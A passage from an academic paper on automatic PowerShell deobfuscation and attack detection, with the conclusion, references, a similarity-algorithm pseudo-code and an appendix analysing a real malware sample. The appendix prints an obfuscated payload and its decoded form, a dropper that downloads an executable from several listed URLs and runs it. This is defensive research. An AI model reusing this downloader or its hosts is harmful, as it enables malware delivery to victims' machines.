+propose a hybrid approach to extract self-contained transformation                           environmentId=100
+                                                                                         [3] 2018. Technique: PowerShell - MITRE ATT&CKâĎć. Retrieved May 10, 2019 from
+functions. However, because of the different language characteristic,                        https://attack.mitre.org/techniques/T1086/
+we employ divergent heuristics and statistical methods, e.g., subtree-                   [4] 2018. TIOBE Index | TIOBE - The Software Quality Company. Retrieved May 10,
+                                                                                             2019 from https://www.tiobe.com/tiobe-index/
+based obfuscation detection and unique feature selection (§4.3).                         [5] 2019. . Retrieved September 20, 2019 from https://github.com/li-zhenyuan/
+   Other approaches [24, 56, 67] focus on simplifying logical struc-                         PowerShellDeobfuscation
+ture such as data flow control flow. However, logic obfuscation is                       [6] 2019. A collection of malware samples and relevant dissection information. Re-
+                                                                                             trieved August 10, 2019 from https://github.com/InQuest/malware-samples/tree/
+rare for PowerShell since it is not effective for evading detection.                         master/2019-03-PowerShell-Obfuscation-Encryption-Steganography
+   Deobfuscation for scripts Recently, several deobfuscation ap-                         [7] 2019. Github. Retrieved May 10, 2019 from https://github.com/search?q=
+proaches for script-based language are proposed. The overall com-                            powershell
+                                                                                         [8] 2019. Malware Sandbox & Automated Analysis - Falcon Sandbox | CrowdStrike.
+parison is shown in the Table 1. Specifically, Liu et al. [41] present                       Retrieved May 10, 2019 from https://www.crowdstrike.com/endpoint-security-
+PSDEM, a mostly manual approach for PowerShell deobfuscation.                                products/falcon-sandbox-malware-analysis/
+                                                                                         [9] 2019. PowerSploit: A PowerShell Post-Exploitation Framework - PowerShellMafi-
+They analyzed several most commonly used obfuscation techniques.                             a/PowerSploit. https://github.com/PowerShellMafia/PowerSploit original-date:
+Then they write obfuscation detection and deobfuscation tools for                            2012-05-26T16:08:48Z.
+every kind of obfuscation. In comparison, our approach is better in                     [10] 2019. Submit a file for malware analysis - Microsoft Security Intelligence. Retrieved
+                                                                                             May 10, 2019 from https://www.microsoft.com/en-us/wdsi/filesubmission
+terms of obfuscation detection accuracy and automation as shown                         [11] 2019. VirusTotal. Retrieved May 10, 2019 from https://www.virustotal.com/#/
+in §6.2.1. Abdelkhalek [13] propose JSDES, a hybrid approach to                              home/upload
+identify suspected functions involved in obfuscation and then deob-                     [12] 2019. Web Scraper. Retrieved May 10, 2019 from https://www.webscraper.io/
+                                                                                        [13] Moataz AbdelKhalek and Ahmed Shosha. 2017. JSDES: An Automated De-
+fuscate with these functions. However, obfuscation does not have                             Obfuscation System for Malicious JavaScript. In Proceedings of the 12th Interna-
+to involve functions. It cannot cover obfuscation using basic oper-                          tional Conference on Availability, Reliability and Security - ARES ’17. ACM Press,
+                                                                                             Reggio Calabria, Italy, 1–13. https://doi.org/10.1145/3098954.3107009
+ations. Lu et al. [42] present a semantics-based approach, which                        [14] Simon Aebersold, Krzysztof Kryszczuk, Sergio Paganoni, Bernhard Tellenbach,
+uses dynamic analysis and program slicing techniques to simplify                             and Timothy Trowbridge. 2016. Detecting obfuscated javascripts using ma-
+away the obfuscation. The common problem of such dynamic ap-                                 chine learning. In ICIMP 2016 the Eleventh International Conference on Internet
+                                                                                             Monitoring and Protection, Valencia, May 22-26, 2016, Vol. 1. Curran Associates,
+proaches is low code coverage. Besides, our approach is generally                            11–17.
+faster than these dynamic methods, since we only need to execute                        [15] Daniel Bohannon. 2017. AbstractSyntaxTree-Based PowerShell Obfuscation -
+deobfuscation part of the script, most of which is string operation.                         cobbr.io. Retrieved April 2, 2019 from https://cobbr.io/AbstractSyntaxTree-
+                                                                                             Based-PowerShell-Obfuscation.html
+                                                                                        [16] Daniel Bohannon. 2017. ObfuscatedEmpire - Use an obfuscated, in-memory Power-
+9    CONCLUSION                                                                              Shell C2 channel to evade AV signatures - cobbr.io. Retrieved May 10, 2019 from
+                                                                                             https://cobbr.io/ObfuscatedEmpire.html
+In this paper, we design the first effective and light-weight de-                       [17] Daniel Bohannon. 2019. PowerShell Obfuscation Detection Framework. Contribute
+obfuscation approach for PowerShell scripts. To address the key                              to danielbohannon/Revoke-Obfuscation development by creating an account on
+                                                                                             GitHub. https://github.com/danielbohannon/Revoke-Obfuscation original-date:
+challenge of precisely identifying the recoverable script pieces, we                         2017-07-11T01:20:48Z.
+design a novel subtree-based deobfuscation method that performs                         [18] Christian Borgelt. 2005. An Implementation of the FP-growth Algorithm. In
+                                                                                             Proceedings of the 1st international workshop on open source data mining: frequent
+obfuscation detection and emulation-based recovery at the level of                           pattern mining implementations. ACM, 1–5.
+subtrees. Building upon this new deobfuscation method, we further                       [19] Juan Caballero, Noah M Johnson, Stephen McCamant, and Dawn Song. 2009. Bi-
+design the first semantic-aware PowerShell attack detection system                           nary code extraction and interface identification for security applications. Technical
+                                                                                             Report. CALIFORNIA UNIV BERKELEY DEPT OF ELECTRICAL ENGINEERING
+with 31 newly-identifies OOA rules. Based on a collection of 6483                            AND COMPUTER SCIENCE.
+PowerShell script samples, our deobfuscation method is shown to                         [20] Davide Canali, Marco Cova, Giovanni Vigna, and Christopher Kruegel. 2011.
+be both efficient and effective. Furthermore, with our deobfuscation                         Prophiler: a fast filter for the large-scale detection of malicious web pages. In
+                                                                                             Proceedings of the 20th international conference on World wide web. ACM, 197–206.
+applied, the attack detection rates for Windows Defender and Virus-                     [21] Wueest Candid. 2016. The Increased Use of PowerShell in Attacks. Retrieved May
+Total increase substantially from 0.3% and 2.65% to 75.0% and 90.0%.                         10, 2019 from https://www.symantec.com/content/dam/symantec/docs/security-
+                                                                                             center/white-papers/increased-use-of-powershell-in-attacks-16-en.pdf
+Also our semantic-aware attack detection system outperforms both                        [22] Mihai Christodorescu, Somesh Jha, Sanjit A Seshia, Dawn Song, and Randal E
+Windows Defender and VirusTotal with a 92.3% true positive rate                              Bryant. 2005. Semantics-aware malware detection. In 2005 IEEE Symposium on
+and a 0% false-positive rate on average.                                                     Security and Privacy (S&P’05). IEEE, 32–46.
+                                                                                        [23] Kevin Coogan, Saumya Debray, Tasneem Kaochar, and Gregg Townsend. 2009.
+                                                                                             Automatic static unpacking of malware binaries. In 2009 16th Working Conference
+                                                                                             on Reverse Engineering. IEEE, 167–176.
+ACKNOWLEDGMENTS                                                                         [24] Kevin Coogan, Gen Lu, and Saumya Debray. 2011. Deobfuscation of virtualization-
+We would like to thank the anonymous reviewers for providing                                 obfuscated software: a semantics-based approach. In Proceedings of the 18th ACM
+                                                                                             conference on Computer and communications security. ACM, 275–284.
+valuable feedback on our work. This work is supported by the                            [25] Marco Cova, Christopher Kruegel, and Giovanni Vigna. 2010. Detection and anal-
+Key Research and Development Program of Zhejiang Province                                    ysis of drive-by-download attacks and malicious JavaScript code. In Proceedings
+(2018C01088).                                                                                of the 19th international conference on World wide web. ACM, 281–290.
+                                                                                        [26] Charlie Curtsinger, Benjamin Livshits, Benjamin G Zorn, and Christian Seifert.
+                                                                                             2011. ZOZZLE: Fast and Precise In-Browser JavaScript Malware Detection.. In
+                                                                                             USENIX Security Symposium. San Francisco, 33–48.
+REFERENCES                                                                              [27] Artem Dinaburg, Paul Royal, Monirul Sharif, and Wenke Lee. 2008. Ether: mal-
+ [1] 2018. Empire is a PowerShell and Python post-exploitation agent.: EmpirePro-            ware analysis via hardware virtualization extensions. In Proceedings of the 15th
+     ject/Empire. https://github.com/EmpireProject/Empire original-date: 2015-08-            ACM conference on Computer and communications security. ACM, 51–62.
+     05T18:25:57Z.                                                                      [28] Matt Fredrikson, Somesh Jha, Mihai Christodorescu, Reiner Sailer, and Xifeng
+ [2] 2018. Free Automated Malware Analysis Service - powered by Falcon Sandbox -             Yan. 2010. Synthesizing near-optimal malware specifications from suspicious
+     Viewing online file analysis results for ’50e8e369b6be8077fd8b53c6dbfe3814.doc’.        behaviors. In 2010 IEEE Symposium on Security and Privacy. IEEE, 45–60.
+     Retrieved March 13, 2019 from https://www.hybrid-analysis.com/sample/
+[29] Ekta Gandotra, Divya Bansal, and Sanjeev Sofat. 2014. Malware analysis and            [53] Gili Rusak, Abdullah Al-Dujaili, and Una-May O’Reilly. 2018. AST-Based Deep
+     classification: A survey. Journal of Information Security 5, 02 (2014), 56.                Learning for Detecting Malicious PowerShell. arXiv:1810.09230 [cs, stat] (Oct.
+[30] Rick Cole Geoff Ackerman. 2018.                OVERRULED: Containing a Po-                 2018). https://doi.org/10.1145/3243734.3278496 arXiv: 1810.09230.
+     tentially Destructive Adversary.              Retrieved May 10, 2019 from             [54] Samratashok. 2018. samratashok/nishang: Nishang - Offensive PowerShell for red
+     https://www.fireeye.com/blog/threat-research/2018/12/overruled-containing-                 team, penetration testing and offensive security. Retrieved May 10, 2019 from
+     a-potentially-destructive-adversary.html                                                   https://github.com/samratashok/nishang
+[31] HemantMahawar. 2019. Script Tracing and Logging. Retrieved May 10, 2019               [55] Robert Diggs says. 2017. Pulling Back the Curtains on EncodedCommand Power-
+     from https://docs.microsoft.com/en-us/powershell/wmf/5.0/audit_script                      Shell Attacks. Retrieved May 10, 2019 from https://unit42.paloaltonetworks.com/
+[32] Danny Hendler, Shay Kels, and Amir Rubin. 2018. Detecting Malicious PowerShell             unit42-pulling-back-the-curtains-on-encodedcommand-powershell-attacks/
+     Commands Using Deep Neural Networks. In Proceedings of the 2018 on Asia               [56] Monirul Sharif, Andrea Lanzi, Jonathon Giffin, and Wenke Lee. 2009. Automatic
+     Conference on Computer and Communications Security (ASIACCS ’18). ACM, New                 reverse engineering of malware emulators. In 2009 30th IEEE Symposium on
+     York, NY, USA, 187–197. https://doi.org/10.1145/3196494.3196511                            Security and Privacy. IEEE, 94–109.
+[33] Ahl Ian. 2017. Privileges and Credentials: Phished at the Request of Counsel Âń       [57] Monirul I Sharif, Andrea Lanzi, Jonathon T Giffin, and Wenke Lee. 2008. Impeding
+     Privileges and Credentials: Phished at the Request of Counsel. Retrieved May 10,           Malware Analysis Using Conditional Code Obfuscation.. In NDSS.
+     2019 from https://www.fireeye.com/blog/threat-research/2017/06/phished-at-            [58] Li Sun, Steven Versteeg, Serdar Boztaş, and Trevor Yann. 2010. Pattern recognition
+     the-request-of-counsel.html                                                                techniques for the classification of malware packers. In Australasian Conference
+[34] Guhyeon Jeong, Euijin Choo, Joosuk Lee, Munkhbayar Bat-Erdene, and Heejo                   on Information Security and Privacy. Springer, 370–390.
+     Lee. 2010. Generic unpacking using entropy analysis. In 2010 5th International        [59] Symantec. 2018. Security Center White Papers | Symantec. https://www.symantec.
+     Conference on Malicious and Unwanted Software. IEEE, 98–105.                               com/security-center/white-papers
+[35] Mehran Jodavi, Mahdi Abadi, and Elham Parhizkar. 2015. JSObfusDetector: A             [60] Weltner Tobias. 2018. New Obfuscation Modes. Retrieved May 10, 2019 from
+     binary PSO-based one-class classifier ensemble to detect obfuscated JavaScript             http://www.powertheshell.com/obfuscationmode/
+     code. In 2015 The International Symposium on Artificial Intelligence and Signal       [61] Xabier Ugarte-Pedrero, Davide Balzarotti, Igor Santos, and Pablo G Bringas. 2015.
+     Processing (AISP). IEEE, Mashhad, Iran, 322–327. https://doi.org/10.1109/AISP.             SoK: Deep packer inspection: A longitudinal study of the complexity of run-time
+     2015.7123508                                                                               packers. In 2015 IEEE Symposium on Security and Privacy. IEEE, 659–673.
+[36] joeyaiello. 2019. PowerShell Scripting. Retrieved May 10, 2019 from https:            [62] Xabier Ugarte-Pedrero, Igor Santos, and Pablo G Bringas. 2011. Structural feature
+     //docs.microsoft.com/en-us/powershell/scripting/overview                                   based anomaly detection for packed executable identification. In Computational
+[37] Min Gyung Kang, Pongsin Poosankam, and Heng Yin. 2007. Renovo: A hidden                    intelligence in security for information systems. Springer, 230–237.
+     code extractor for packed executables. In Proceedings of the 2007 ACM workshop        [63] Xabier Ugarte-Pedrero, Igor Santos, Iván García-Ferreira, Sergio Huerta, Borja
+     on Recurring malcode. ACM, 46–53.                                                          Sanz, and Pablo G Bringas. 2014. On the adoption of anomaly detection for
+[38] Scott Kaplan, Benjamin Livshits, Benjamin Zorn, Christian Siefert, and Charlie             packed executable filtering. Computers & Security 43 (2014), 126–144.
+     Curtsinger. 2011. " NOFUS: Automatically Detecting"+ String. fromCharCode             [64] Candid Wueest and Himanshu Anand. 2017.                ISTR Living off the land
+     (32)+" ObFuSCateD". toLowerCase ()+" JavaScript Code. Technical report, Technical          and fileless attack techniques.           Retrieved May 10, 2019 from https:
+     Report MSR-TR 2011–57, Microsoft Research (2011).                                          //www.symantec.com/content/dam/symantec/docs/security-center/white-
+[39] Rainer Koschke, Raimar Falke, and Pierre Frenzel. 2006. Clone Detection Using              papers/istr-living-off-the-land-and-fileless-attack-techniques-en.pdf
+     Abstract Syntax Suffix Trees. In 2006 13th Working Conference on Reverse Engi-        [65] Candid Wueest and Doherty Stephen. 2016. The Increased Use of PowerShell
+     neering. IEEE, Benevento, Italy, 253–262. https://doi.org/10.1109/WCRE.2006.18             in Attacks. https://www.symantec.com/content/dam/symantec/docs/security-
+[40] Rainer Koschke, Raimar Falke, and Pierre Frenzel. 2006. Clone detection using ab-          center/white-papers/increased-use-of-powershell-in-attacks-16-en.pdf
+     stract syntax suffix trees. In 2006 13th Working Conference on Reverse Engineering.   [66] Wei Xu, Fangfang Zhang, and Sencun Zhu. 2012. The power of obfuscation
+     IEEE, 253–262.                                                                             techniques in malicious JavaScript code: A measurement study. In 2012 7th Inter-
+[41] Chao Liu, Bin Xia, Min Yu, and Yunzheng Liu. 2018. PSDEM: A Feasible De-                   national Conference on Malicious and Unwanted Software. IEEE, 9–16.
+     Obfuscation Method for Malicious PowerShell Detection. In 2018 IEEE Symposium         [67] Babak Yadegari, Brian Johannesmeyer, Ben Whitely, and Saumya Debray. 2015.
+     on Computers and Communications (ISCC). IEEE, Natal, 00825–00831. https:                   A generic approach to automatic deobfuscation of executable code. In 2015 IEEE
+     //doi.org/10.1109/ISCC.2018.8538691                                                        Symposium on Security and Privacy. IEEE, 674–691.
+[42] Gen Lu and Saumya Debray. 2012. Automatic simplification of obfuscated                [68] Yanfang Ye, Dingding Wang, Tao Li, Dongyi Ye, and Qingshan Jiang. 2008. An
+     JavaScript code: A semantics-based approach. In 2012 IEEE Sixth International              intelligent PE-malware detection system based on association mining. Journal in
+     Conference on Software Security and Reliability. IEEE, 31–40.                              computer virology 4, 4 (2008), 323–334.
+[43] Viral Maniar. 2019. Python based backdoor that uses Gmail to exfiltrate data          [69] Qiang Zeng, Lannan Luo, Zhiyun Qian, Xiaojiang Du, and Zhoujun Li. 2018.
+     through attachment. This RAT will help during red team engagements to backdoor             Resilient decentralized Android application repackaging detection using logic
+     any Windows machines. It tracks the user activity using scree.. https://github.com/        bombs. In Proceedings of the 2018 International Symposium on Code Generation
+     Viralmaniar/Powershell-RAT original-date: 2018-03-15T01:51:08Z.                            and Optimization. ACM, 50–61.
+[44] Lorenzo Martignoni, Mihai Christodorescu, and Somesh Jha. 2007. Omniunpack:           [70] Tong Zhang. 2004. Solving large scale linear prediction problems using stochas-
+     Fast, generic, and safe unpacking of malware. In Twenty-Third Annual Computer              tic gradient descent algorithms. In Proceedings of the twenty-first international
+     Security Applications Conference (ACSAC 2007). IEEE, 431–441.                              conference on Machine learning. ACM, 116.
+[45] Kersten Max. 2019. Emotet droppers. Retrieved May 8, 2019 from https://
+     maxkersten.nl/binary-analysis-course/malware-analysis/emotet-droppers/
+[46] Mr Md Rehaman Pasha, Mrs Y Prathima, and Mr L Thirupati. 2014. Malwise
+     System for Packed and Polymorphic Malware. vol 3 (2014), 167–172.
+[47] Roberto Perdisci, Andrea Lanzi, and Wenke Lee. 2008. Classification of packed
+     executables for accurate computer virus detection. Pattern recognition letters 29,
+     14 (2008), 1941–1946.
+[48] R3MRUM. 2019. PowerShell script for deobfuscating encoded PowerShell scripts:
+     R3MRUM/PSDecode. https://github.com/R3MRUM/PSDecode original-date: 2017-
+     12-11T02:27:42Z.
+[49] Jithu Raphel and P Vinod. 2015. Information theoretic method for classification
+     of packed and encoded files. In Proceedings of the 8th International Conference on
+     Security of Information and Networks. ACM, 296–303.
+[50] Dhavleesh Rattan, Rajesh Bhatia, and Maninder Singh. 2013. Software clone
+     detection: A systematic review. Information and Software Technology 55, 7 (2013),
+     1165–1199.
+[51] Konrad Rieck, Tammo Krueger, and Andreas Dewald. 2010. Cujo: efficient de-
+     tection and prevention of drive-by-download attacks. In Proceedings of the 26th
+     Annual Computer Security Applications Conference. ACM, 31–39.
+[52] Paul Royal, Mitch Halpin, David Dagon, Robert Edmonds, and Wenke Lee. 2006.
+     Polyunpack: Automating the hidden-code extraction of unpack-executing mal-
+     ware. In 2006 22nd Annual Computer Security Applications Conference (ACSAC’06).
+     IEEE, 289–300.
+A    PSEUDO CODE USED TO CALCULATE THE                                 B    REAL-WORLD SAMPLE ANALYSIS
+     SIMILARITY                                                        The following is a real-world malicious PowerShell script [2], which
+The pseudo code 1 shows the algorithm used to calculate the simi-      is obfuscated with two different methods. Figure 10 is the obfus-
+larity between the deobufscated scripts and the original scripts.      cated malware sample. Figure 11 shows the intermediate results of
+                                                                       deobfuscating one layer of obfuscation. Figure 12 is the final result.
+Algorithm 1 Calculate the similarity between two scripts                  We also deobfuscate another more complex example [6], which
+Input: AST for the script a TL ; AST for the script b TR               is obfuscated 6 layers sequentially, and successfully get the original
+Output: Similarity Similarity                                          script with our approach.
+  1: Let L be the count of nodes in TL                                    Specifically, the first layer is a script-block level obfuscation with
+  2: Let R be the count of nodes in TR                                 base64 encoding, the second layer is a script-block level obfuscation
+  3: S := 0                                                            with hex encoding, the third layer is a script-block level obfuscation
+  4: Breadth-first traverse the TL and put nodes into a queue Q L      with binary encoding, and the last three layers are all token level
+  5: Breadth-first traverse the TR and put nodes into a queue Q R      obfuscations with string manipulation.
+  6: while Q L is not empty do
+  7:     nl := Q L [0]                                                 C    AN EXAMPLE OF MIXED SCRIPTS
+  8:     Let tl be the subtree root as tl                              Figure 13 is an example of the mixed scripts we constructed.
+  9:     Let l be the count of nodes in the tl
+ 10:     Serialize the tl to an array al with Pre-order traverse
+ 11:     while Q R is not empty do
+ 12:         nr := Q R [0]
+ 13:         Let tr be the subtree root as tr
+ 14:         Let r be the count of nodes in the tr
+ 15:         Serialize the tr to an array ar with Pre-order traverse
+ 16:         Let as be the longest sub sequence between al and ar
+ 17:         Let s be the length of as
+ 18:         n := 2 × s/(2 × s + l + r )
+ 19:         if n > 0.7 then
+ 20:             S := S + s
+ 21:             Remove nl and all its ancestor nodes from Q L
+ 22:             Remove nr and all its ancestor nodes from Q R
+ 23:         else
+ 24:             Continue
+ 25:         end if
+ 26:     end while
+ 27:     Remove nl from Q L
+ 28: end while
+ 29: Similarity := 2 × S/(2 × S + L + R)
+ 30: Output Similarity
+powershell "([RUNTiME.iNTeRopsErViCeS.mArShal]::PTRTOstRiNGuNi(
+[rUnTime.IntErOPSERvIceS.maRsHal]::sECUResTriNGTOgLOBAlAlLOCUNIcoDe($('76492d1116743f0423413b16050a5345MgB8AFgAMgBB
+AGoAdwB2ADUAdgBzAEMAYwBlADkASwBMAFAAaAB1AEsANwB4AEEAPQA9AHwAYQBkADAAMwA0AGUAOQBiAGMAZABjADUAOABhAGMAYgAzADgANQA4ADM
+AOQBiAGQAYQAyADEAMwA2ADIAZgA3ADgAMwBlADUAZAAzADkANwBlAGUAMABkADcAZQA1AGEAOQBhADYAMQBlADEAMABlAGIAZABmADkAMQBkADEAYw
+AwAGQAMgA3ADcANwAyADAAOQA4AGMAYwA3ADYANABmADUANQAxADQAYgA1AGUAYgA3AGIAZQAxADcANgA3ADgAYwA1ADIANwA5ADMAMgBiAGEAZQA2A
+DEANAA1AGYAYwAyAGUAZgBkAGEAZgAyADgAMABlAGUAZgAzADIANABkADQANgA3AGQAMgBkADcAZgBmADEAZABkAGIAYgA1AGUANwBkAGUANAA1ADEA
+OAA4ADMANQAxAGUAMQA5AGUANgBhAGUANwA0ADkAMQA4ADMAZgAwADIANwBiADEAZAAwADkANAAxAGEAYwA4AGEAOQBlADAANgA4AGEAYgA2AGMAMgA
+1AGYANQA5ADQAOQAzADgAYgA1AGIANgA3ADIANwA1ADUANgA4ADEAYgBlADMANgA3AGQAYgBmAGEAZQBlADYAZgAwAGUAMgA5ADcAZQBlADAAZQBmAG
+YAZQBlADMAYgAzAGUAOAA2ADgAMQBiAGIAMQBlAGMANwA5ADAAYwBjADMAMwAxADUANwA0AGEAYQBkADAAYgA4ADUANwBkADMANwA5ADYAYQBmADgAM
+gBlADgAZQA4ADUAYwAwAGYAZQBmADIAMQBkADEAZQAxADQAMQA0AGYAYgA3ADUAMQA2ADgAMAAyAGEANAAzAGQAYQBkAGIAMABkADgANAA1ADYANQA3
+ADQANwBhADAAZQA4ADgAOQBjADQANgAyADkAZQAyAGYAZQA4ADcAOAA0ADgANwA3ADkAMwA4ADcAZQA0ADEAZAAzAGQAZQA0ADcANgA1ADEANwBiAGY
+AMgAxADYAMQA1ADUAMQAzAGUAYgA4ADAAMgA1ADgAOAAzADgAZQBkAGQAZgBhADIAMAA2ADMANAAwADgAZAAxADIAMwA0AGIAOQBlAGIAZQAyADcAOQ
+A1AGMAMwBiADQAMQBlAGQAMgBjADYAMwA0ADkAOQAyAGMAMwBlADcAYQBhAGUAYQA4AGIAZgAwADMANwAyADMAYQA2ADMAZgA1AGMANQBjADcAMQA1A
+GEANQA1ADMANgBiAGEAZQBmAGYAMwA5ADQAMwBmADMAZgBjADMAMwBlAGIAYgBjADMAYgA2ADUAYgA2ADIAYQA2AGIAMAA3ADIANQA1AGMAYwA0AGEA
+NAA0AGYAMgAyAGYANwAxAGUAMQBiADEAYgBiADMAMgAxADQAMAAyADcAOAAxADEANQBhAGIANwBhADAAMABhADcAZgA0ADkANwAwADAAOABmAGYAMwA
+3ADkAMwBlADgAOQA3ADYAYQAxADIAOQAwADMANwAwAGUAOQA0AGIAYwBhAGQAMwA3AGEAOQA0AGEAYwA2ADYAOABkAGYAMABiADMAYgBiAGMAZQA4AD
+IAMwAxAGQAYwBhAGQAYgA4ADQAMABlADAAYwA3ADkAYgBjADcAYgBjADcAOQA5ADYAYQAzAGYAZgA3ADUAZABkAGEAYQA0ADUAZgA1ADAAOQA1AGUAO
+AA4ADYAMABjAGIANgA1AGQAYgAwAGMAZgBjADMAZABhADkAOAA1ADYANwBhADQAMwBhADIAYwBhADEAMwA5AGEAMAAzADAANAA3AGIAOQBmAGMAZAA2
+ADgANwBlAGMAMAAzADAAZAA4ADQAMwAwAGEAZQA5ADQANgBhADcANAAxAGYAMABmADYAOAAwADMAOABlAGUAYQA3ADUANABjADgAMwAwADgANAAzAGY
+AMQBiADAAOQA4AGQAZABlAGYAZgAwADYANAAyADAANwA4ADMAMgAzAGQAZQAyADMAZQAwADMAMABkAGEAYQA4AGIANQA5ADMAMAAzADkAOQA3ADgANA
+AwADIANABlADgANAA5ADYAYwA3ADcAMAAwADEAYwAwADYAYgA1AGIANQBiADcAYQA5ADUAOAAxADcAOQA5ADAANwAzADUANgBkADgAZAA3AGQAMwAyA
+GEAYQBlADYANQBmADgAMgA1ADEAMABjAGQAZgBlADcAYwBmAGEAZQAxAGYAZgBkAGEAZQAwADAAMgA2AGIAZgA0ADEAOAA4ADQAYQBlAGQAZQA5AGMA
+OQAwADcAMgBkADUAZgA2AGEAMQA3ADEAMQBiAGEAYgBjAGIAZgBhADgAYwAyADcANwBiADMAYQA5ADAAYgA5ADcANgA1ADAAZgA2ADMAMgAwAGQAYgA
+zAGMAYwA4ADIAZgA2AGQAMQBjADgAMwBmADQAYQAxADYAMgBkADEANgA0ADAAMQBmADIAZgBkADMAYQBlAGIAOQBmAGYAZAAwADQAMwA4AGYANwBhAG
+MAMgBiADIAZQA1AGMAZQA5AGUAMgBlADUAMQA4ADcAOAA3ADYAYgBiAGEAOAA0ADMAZgAxADcANwA3ADYANABjAGQAYwBlADAAMQAyADQAYwBhAGQAN
+gBiAGIAYQAzADUANgA3ADYAZQBiAGIAYgBiAGUANQBlAGQAYwA2AGMANgBhAGIANgAwAGEANQA5ADUAMQBlADUAMQA0ADQAMQBjADcAZABmADEAMgA3
+ADEAYwBkADUAZgBkADYAZAA0ADMAOAA1ADUAZQA0AGQAYQA0ADQAZABlAGYANAA0ADMANgA1ADkAMgAwADUAYwBjADMAMgBkADUAYwA2ADcAYQA1ADQ
+AZQA3AGIAZAAyAGEAOQA2ADcANwAwADkANABhAGUANQBkAGUANwAxAGIAZABiADEAYQA2AGMANwAzAGEAZQA5ADEANwA1AGYAYQA1ADYAOAA3AGIAMg
+BhAGIAZQAyADgAYwA1ADEAZAAzADMAMQBmADEAMQAxADcAOAA4AGYAZAA3ADAANgAyAGUAZgAwADEAYwBmAGQAMQBlADUAMgBjADcANgBkAGEAMgA0A
+DYAMwAzAGIAMwA5AGMAMQA0ADUAYgA1AGMAZgBiAGYAOAA1AGEANwBkADgAMAAxADAAMwAzAGUAMwAxADIAZgAxAGIANAA3AGIAYwBlADUAMgAwADYA
+MgA1AGIAYwBlAGMAMwAwAGUANABlADkAMAAyAGYAOAA3ADEANQAxADMAMABhADAAMAA5ADkAYgA1ADQAZQBlAGYANQBjADgAMQBjAGQAMgA2AGQANQA
+2ADkAZAAyAGEAZgAxADUAYgA5AGYAOABkADQANQBmADAAZQA0ADkAZQA3ADYAYQA2ADAAZAA2ADQAMAA3AGYANwBiADkAMwA2ADkAZgBiADkAYQAxAD
+EAZgA0ADYANAAwAGEAYgBkAGIAYQBjADQAYQBiAGMAYQA4ADIAOAA2AGQAOQBlAGIANQA2AGMAMQA0ADYAZgBiAGQAZABjAGIAYwA2ADIAZAA4ADkAZ
+QBmADYAZgA3AGMAYgAzADcAYgA0ADgANwA5AGIAMwA0AGUAMAAzADQAMgA5ADQAZgAyAGQAZQA3AGQAMQA1ADMAYgBkADIANAA1AGEANgA0AGEANwBl
+ADEAZAAyAGMAZgBhADkAOQBlADUAMgA2ADAAMAA4AGEANgA4ADQAZgA3ADYAOQBlADUAMgBiADYANgA2AGQAYQAwADMANgBkAGMAZQBjAGMAMgBhAGQ
+AMgAwAGQAYgBhAGUANAAwADcANAA4AGYAZAA4AGYANAA0ADkAYQBlADEANwBiAGYAMgBlADMAYgA2ADMAZgA1ADIAYwAxADkANQA5AGYAOQBjAGUAYg
+A0ADEANQA0AGIANQBhADUANQBjAGUAOQBlADMANABmADEAYwAyADEANQAxADQANQA4ADgAOAAyADkANAA3AGUANwBhADQAMgA5ADAANQBhAGIANQAwA
+DIAZgAxAGYAZABlAGYAYgA4ADcAYwAyADMAYwA1AGUAYQA4AGIANABkAGMANwBlADIAMwA2AGMAMwBmAGQAYwAzAGEAZgA5AGQAYQAwADMAOQAxAGQA
+MQBiADgAZAA2ADYAZAA3AGMAMABiADAAMgA1ADYAOABiADYAZQAzADcAMAAzAGUAZAA5ADkAYQA3ADQAZgBjADMANABiAGMAMQA0ADcANABiADMAYgB
+jADQAMwAxAGYANwBiAGUANgA5ADEANwAxADAANAAwAGEAMgAwADEAOQA1AGMANABkADAAMAAwAGEAMQA3AGUANwBjADgANwAzADcAZAA1ADAAMgBjAG
+IAOQBjADEAZQBkADYAYgBmAGEAMgBlAGYANABiADIAMgA1ADMAMQBhADAAYQBkADcAMAAxADcAMgA1ADgAOQA1ADAAZAA0AGEANQAxAGYAMQAwADIAM
+AA3AGMAZgA1AGYAMgA1AGYAYQAxAGYAZgA3ADEAMQBjADEAMwAzADkAZQBhADEAYgA4ADUANgA1ADAAMAAzAGEAMQBiADEAYgA0ADUAYQAzAGIAMgA2
+ADEANwA4ADgAOQA4ADMANwA4ADUAMwA4AGYAMAAwADMAZABkAGEAZAA5ADcAZQBiADYANAAzADkAOQA2ADIAYQBmADYAOQBjAGIAZQA5AGYANQA1ADM
+AZAA5AGMANwBmAGMAZQBiAGIANQAwADAAMABlADYAOQBmADkANwA3ADQAZABjADgAMABjADcAZAA2ADcAZAA4ADEAYgA1AGIANgBkADYAYgBiADAAZg
+A1ADQAMgBmADEAMgA2AGMAYQBjADQAYwBlAGYANgA0AGUAMAA3AGEAMAAyAGEAOAA2ADYAMwA0ADkANQBmADkAYgBlAGEAYwBjADgAMgA5ADIAZgAxA
+DYAZgA1ADYAOQBkAGQAMAA2AGMANwA4AGYANQA2AGQAMgAyADEAYgA3ADkAMgA1AGUAZQAyAGUANABkADEAMgBkAGUANgBlAGQANAA4AGIANQA1ADQA
+NwA5ADQAZQBhAGIANAAxAGEANgBmADYAZgBmADgAYQAzADIAMwAzAGYAYQA5ADkANwA2ADIANwA5ADEAMwA0AGQAYwBmAGMAOQAyADIANABkADUAYwA
+1AGQANAAyAGEANwBlADAANAA5ADUANwA1ADMAZgAwAGYAZgBjAGMAOQA3ADcAMAA4AGIAMwA1ADQAMgA3AGMAZAA1ADQANAAzADAANwAwAGIAMgAwAD
+QAYgA4AGYAMQA4ADAAZgAyAGYAZABkADEANwBhADAANwBjADYANwAxADAANgA='| cOnVertTO-SEcUrEStrinG -KE
+196,148,187,123,187,195,213,254,9,250,232,193,112,146,83,172,255,41,240,23,34,95,215,17,226,111,128,53,126,193,106,
+149)) ))| .( $Env:cOMSpeC[4,24,25]-JOIn'')
+
+
+
+                                     Figure 10: An Obfuscated malware sample
+$nsadasd = &('n'+'e'+'w-objec'+'t') random;
+$YYU = .('ne'+'w'+'-object') System.Net.WebClient;
+$NSB = $nsadasd.next(10000, 282133);
+$ADCX = '
+http://quote.freakget.com/wpcontent/rCk5/@http://www.lightchasers.in/Mwmg/@http://casastoneworks.com.au/9ARR4/@http:
+//jasclair.com/scI8YTL/@http://convivialevent.fr/IoVWm/'.Split('@');
+$SDC = $env:public + '\' + $NSB + ('.ex'+'e');
+foreach($asfc in $ADCX)
+{
+try
+{
+$YYU."Do`Wnl`OadFI`le"($asfc."ToStr`i`Ng"(), $SDC);
+&('Invo'+'k'+'e-Item')($SDC);
+break;
+}catch{}
+}
+
